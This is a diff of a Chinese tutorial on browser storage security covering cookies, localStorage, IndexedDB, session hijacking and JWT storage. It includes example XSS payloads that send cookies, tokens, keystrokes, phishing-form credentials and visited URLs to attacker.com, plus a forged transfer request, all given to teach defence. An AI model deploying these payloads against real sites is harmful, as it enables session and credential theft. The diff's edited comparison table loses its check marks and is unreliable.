@@ -17,7 +17,7 @@
 
 ```
 Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/; 
-            Secure; HttpOnly; SameSite=Lax; Max-Age=3600
+ Secure; HttpOnly; SameSite=Lax; Max-Age=3600
 ```
 
 ### JS操作Cookie
@@ -38,8 +38,8 @@ document.cookie = "key=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 
 | Cookie设置了什么 | document.cookie能读取吗？ |
 |-----------------|---------------------------|
-| 无特殊属性 | ✓ 可以 |
-| HttpOnly | ✗ 不可以（这是重点！） |
+| 无特殊属性 | 可以 |
+| HttpOnly | 不可以（这是重点！） |
 | Secure | 仅HTTPS页面可读 |
 | Path | 仅在匹配路径下可见 |
 
@@ -62,19 +62,19 @@ document.cookie = "key=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 
 ```
 SameSite=Strict:
-  - 用户从第三方网站点击链接 → 不会带Cookie
-  - CSRF不能携带Cookie → CSRF完全防御
-  - 但用户体验差（点击链接需要重新登录）
+ - 用户从第三方网站点击链接 → 不会带Cookie
+ - CSRF不能携带Cookie → CSRF完全防御
+ - 但用户体验差（点击链接需要重新登录）
 
 SameSite=Lax (Chrome默认):
-  - GET顶级导航（用户点击链接）→ 会带Cookie ✓
-  - iframe/subresource → 不会带Cookie
-  - POST跨站表单 → 不会带Cookie ✓（CSRF防御）
+ - GET顶级导航（用户点击链接）→ 会带Cookie 
+ - iframe/subresource → 不会带Cookie
+ - POST跨站表单 → 不会带Cookie （CSRF防御）
 
 SameSite=None:
-  - 需要同时设置 Secure
-  - 所有请求都会带Cookie
-  - CSRF攻击可用 → 必须配合CSRF Token
+ - 需要同时设置 Secure
+ - 所有请求都会带Cookie
+ - CSRF攻击可用 → 必须配合CSRF Token
 ```
 
 ## 三、localStorage与sessionStorage
@@ -118,7 +118,7 @@ localStorage.setItem('token', 'abc123');
 // fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))
 
 // 结论：敏感Token存在localStorage ≠ 安全！
-//      即使没有Cookie窃取风险，XSS仍然可以通过JS发起请求
+// 即使没有Cookie窃取风险，XSS仍然可以通过JS发起请求
 ```
 
 ## 四、IndexedDB与WebSQL
@@ -130,18 +130,18 @@ localStorage.setItem('token', 'abc123');
 const request = indexedDB.open('MyDatabase', 1);
 
 request.onsuccess = function(e) {
-  const db = e.target.result;
-  
-  // 创建事务
-  const tx = db.transaction('users', 'readwrite');
-  const store = tx.objectStore('users');
-  
-  // 写入数据
-  store.add({ id: 1, name: 'admin', token: 'secret_token' });
-  
-  // 读取数据
-  const getReq = store.get(1);
-  getReq.onsuccess = function() { console.log(getReq.result); };
+ const db = e.target.result;
+ 
+ // 创建事务
+ const tx = db.transaction('users', 'readwrite');
+ const store = tx.objectStore('users');
+ 
+ // 写入数据
+ store.add({ id: 1, name: 'admin', token: 'secret_token' });
+ 
+ // 读取数据
+ const getReq = store.get(1);
+ getReq.onsuccess = function() { console.log(getReq.result); };
 };
 ```
 
@@ -172,10 +172,10 @@ new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(docu
 
 // 直接利用当前Session发起恶意操作
 fetch('https://bank.com/transfer', {
-  method: 'POST',
-  credentials: 'include',  // 自动带HttpOnly Cookie
-  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  body: 'to=attacker&amount=10000'
+ method: 'POST',
+ credentials: 'include', // 自动带HttpOnly Cookie
+ headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+ body: 'to=attacker&amount=10000'
 });
 // 结论：HttpOnly防止Cookie被窃取，但不防止Cookie被使用！
 ```
@@ -189,12 +189,12 @@ navigator.serviceWorker.register('/evil-sw.js');
 
 // evil-sw.js:
 self.addEventListener('fetch', event => {
-  const url = event.request.url;
-  // 将所有请求URL发送到攻击者服务器
-  fetch('https://attacker.com/log?url=' + encodeURIComponent(url));
-  
-  // 正常处理请求
-  event.respondWith(fetch(event.request));
+ const url = event.request.url;
+ // 将所有请求URL发送到攻击者服务器
+ fetch('https://attacker.com/log?url=' + encodeURIComponent(url));
+ 
+ // 正常处理请求
+ event.respondWith(fetch(event.request));
 });
 ```
 
@@ -204,25 +204,25 @@ self.addEventListener('fetch', event => {
 
 ```
 阶段1：信息收集
-  - 确认目标使用Session机制（Cookie名如PHPSESSID, JSESSIONID）
-  - 确认Cookie是否有HttpOnly、Secure、SameSite
+ - 确认目标使用Session机制（Cookie名如PHPSESSID, JSESSIONID）
+ - 确认Cookie是否有HttpOnly、Secure、SameSite
 
 阶段2：获取Session凭证
-  路径A（无HttpOnly）：
-    XSS → document.cookie → 外泄到攻击者服务器
-  
-  路径B（有HttpOnly）：
-    XSS → 直接利用当前页面发起操作（不看Cookie值）
-    或：中间人攻击 → 网络层窃取Cookie
+ 路径A（无HttpOnly）：
+ XSS → document.cookie → 外泄到攻击者服务器
+ 
+ 路径B（有HttpOnly）：
+ XSS → 直接利用当前页面发起操作（不看Cookie值）
+ 或：中间人攻击 → 网络层窃取Cookie
 
 阶段3：Session固定攻击（Session Fixation）
-  - 攻击者先获得一个Session ID
-  - 诱导受害者使用相同的Session ID登录
-  - 攻击者用已知道的Session ID访问受害者的Session
+ - 攻击者先获得一个Session ID
+ - 诱导受害者使用相同的Session ID登录
+ - 攻击者用已知道的Session ID访问受害者的Session
 
 阶段4：Session重用
-  - 将窃取的Cookie注入浏览器
-  - 访问目标网站 → 服务器认为你是受害者
+ - 将窃取的Cookie注入浏览器
+ - 访问目标网站 → 服务器认为你是受害者
 ```
 
 ### Session Fixation攻击
@@ -242,18 +242,18 @@ self.addEventListener('fetch', event => {
 
 // 1. 修改页面内容进行钓鱼
 document.body.innerHTML = `
-  <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:white;z-index:9999">
-    <h1>Session已过期，请重新登录</h1>
-    <form action="https://attacker.com/steal" method="POST">
-      <input name="username" placeholder="用户名">
-      <input type="password" name="password" placeholder="密码">
-    </form>
-  </div>
+ <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:white;z-index:9999">
+ <h1>Session已过期，请重新登录</h1>
+ <form action="https://attacker.com/steal" method="POST">
+ <input name="username" placeholder="用户名">
+ <input type="password" name="password" placeholder="密码">
+ </form>
+ </div>
 `;
 
 // 2. 添加键盘记录器
 document.addEventListener('keypress', function(e) {
-  fetch('https://attacker.com/keylog?k=' + e.key);
+ fetch('https://attacker.com/keylog?k=' + e.key);
 });
 
 // 3. 修改表单action
@@ -266,11 +266,11 @@ document.querySelector('form').action = 'https://attacker.com/steal';
 
 | 存储方式 | XSS窃取 | CSRF | 持久化 | 推荐 |
 |---------|:---:|:---:|:---:|:---:|
-| Cookie + HttpOnly + Secure + SameSite | ✗ | ✓防御 | 是 | ✓ 推荐 |
-| localStorage | ✓ | ✓防御 | 是 | ✗ |
-| sessionStorage | ✓ | ✓防御 | 否 | △ |
-| 内存变量（闭包） | ✗ | ✗ | 否（刷新就丢）| △ |
-| Cookie(无HttpOnly) | ✓ | ✓防御 | 是 | ✗ |
+| Cookie + HttpOnly + Secure + SameSite | | 防御 | 是 | 推荐 |
+| localStorage | | 防御 | 是 | |
+| sessionStorage | | 防御 | 否 | △ |
+| 内存变量（闭包） | | | 否（刷新就丢）| △ |
+| Cookie(无HttpOnly) | | 防御 | 是 | |
 
 ### JWT存储的最佳实践
 
@@ -285,12 +285,12 @@ let accessToken = null;
 
 // Token刷新流程
 async function refreshAccessToken() {
-  const resp = await fetch('/api/refresh', {
-    method: 'POST',
-    credentials: 'include',  // 自动带Refresh Token Cookie
-  });
-  const data = await resp.json();
-  accessToken = data.access_token;  // 新Token放内存
+ const resp = await fetch('/api/refresh', {
+ method: 'POST',
+ credentials: 'include', // 自动带Refresh Token Cookie
+ });
+ const data = await resp.json();
+ accessToken = data.access_token; // 新Token放内存
 }
 ```
 
